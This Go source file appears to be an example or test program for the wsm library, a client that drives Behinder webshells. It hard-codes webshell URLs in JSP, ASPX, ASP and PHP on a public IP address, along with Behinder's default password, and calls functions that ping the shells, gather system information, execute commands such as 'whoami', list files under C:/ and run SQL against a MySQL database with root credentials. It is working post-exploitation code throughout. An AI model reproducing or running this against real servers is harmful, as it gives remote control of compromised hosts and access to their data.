package main

import (
	"fmt"
	"github.com/go0p/wsm"
	"github.com/go0p/wsm/lib/shell"
	"github.com/go0p/wsm/lib/shell/behinder"
	"log"
)

const (
	// JspIndexShellUrl 测试输出存在干扰字符的情况
	JspIndexShellUrl = "http://139.196.175.86:8080/bxindex.jsp"
	JspShellUrl      = "http://139.196.175.86:8080/bx.jsp"
	CsharpShellUrl   = "http://139.196.175.86:8081/bx.aspx"
	AspShellUrl      = "http://139.196.175.86:8081/bx.asp"
	PhpShellUrl      = "http://139.196.175.86/bx.php"
)

func main() {
	log.SetFlags(log.Lshortfile)
	//log.Println("Jsp Index")
	//testJspIndex()
	log.Println("Jsp")
	testJsp()
	//log.Println("Aspx")
	//testAspx()
	//log.Println("Asp")
	//testAsp()
	//log.Println("Php")
	//testPhp()
}

func testPhp() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      PhpShellUrl,
			Password: "rebeyond",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	i, err := bx.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(i)
}

func testAsp() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspShellUrl,
			Password: "rebeyond",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}

	i, err := bx.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(i)
}

func testAspx() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      CsharpShellUrl,
			Password: "rebeyond",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		},
	}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}

	i, err := bx.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(i)
}

func testJsp() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspShellUrl,
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	//p := &behinder.PingParams{
	//	// response 结果不加密测试
	//	OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
	//	Content:        "xxxxxxx",
	//}
	//i, err := bx.Ping(p)
	//if err != nil {
	//	log.Println(err)
	//}
	//fmt.Println(i)
	////z := &behinder.BasicInfoParams{
	////	OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
	////	WhatEver:       "xxxxxxx",
	////}
	////b, err := bx.BasicInfo(z)
	//b, err := bx.BasicInfo()
	//if err != nil {
	//	log.Println(err)
	//}
	//fmt.Println(b.ToMap())
	//
	//e := &behinder.ExecParams{
	//	OnlyJavaParams: behinder.OnlyJavaParams{},
	//	Cmd:            "whoami",
	//	Path:           "C:\\shells\\apache-tomcat-8.5.70\\bin",
	//}
	//exec, err := bx.CommandExec(e)
	//if err != nil {
	//	log.Println(err)
	//}
	//fmt.Println(exec.ToMap())

	//f := &behinder.ListFiles{
	//	Path: "C:/",
	//}
	//file, err := bx.FileManagement(f)
	//if err != nil {
	//	log.Println(err)
	//}
	//fmt.Println(file.ToMap())

	db := &behinder.DBManagerParams{
		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: false, NotEncrypt: true},
		Type:           "mysql",
		Host:           "127.0.0.1",
		Port:           3306,
		User:           "root",
		Pass:           "root",
		Database:       "godzilla",
		Sql:            "SHOW DATABASES",
	}
	dbres, err := bx.DatabaseManagement(db)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(dbres.ToMap())
}

func testJspIndex() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspIndexShellUrl,
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers: map[string]string{
				//"User-Agent":  "xxxxxxxxxxxxxxxxxxxxx",
				"User-Agent2": "xxxxxxxxxxxxxxxxxxxxx",
			},
			//Headers: map[string]string{"Content-type": "application/x-www-form-urlencoded"},

		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	p := &behinder.PingParams{
		// response 结果不加密测试
		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: false},
		Content:        "xxxxxxx",
	}
	i, err := bx.Ping(p)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(i)
	z := &behinder.BasicInfoParams{
		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
		WhatEver:       "xxxxxxx",
	}
	b, err := bx.BasicInfo(z)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(b.ToMap())
}
